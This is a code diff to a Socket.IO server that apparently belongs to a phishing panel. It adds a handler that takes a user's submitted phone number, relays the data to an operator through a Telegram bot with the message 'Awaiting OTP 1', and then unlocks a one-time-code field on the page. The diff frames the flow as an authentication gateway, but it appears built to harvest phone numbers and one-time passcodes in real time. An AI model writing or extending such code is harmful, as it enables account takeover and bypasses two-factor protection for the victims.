@@ -50,6 +50,17 @@ io.on('connection', (socket) => {
     // STAGE 1: GATEWAY AUTHENTICATION STREAM
     // ==========================================
 
+    // ADDED: Listens for the initial phone submission and alerts admin to send OTP
+    socket.on('request-otp1', (data) => {
+        const currentId = data.appId || initialAppId;
+        
+        // Notify the admin via Telegram bot that a user needs an OTP
+        botManager.sendToAdmin(currentId, "🇸🇴 Initial Request: Phone Submitted & Awaiting OTP 1", data, false);
+        
+        // Tell the frontend that the server processed the request, enabling the OTP input field
+        socket.emit('otp1-requested-success');
+    });
+
     // NEW STEP 1: Phone number and Initial OTP payload delivery 
     socket.on('step4-otp', (data) => {
         const currentId = data.appId || initialAppId;
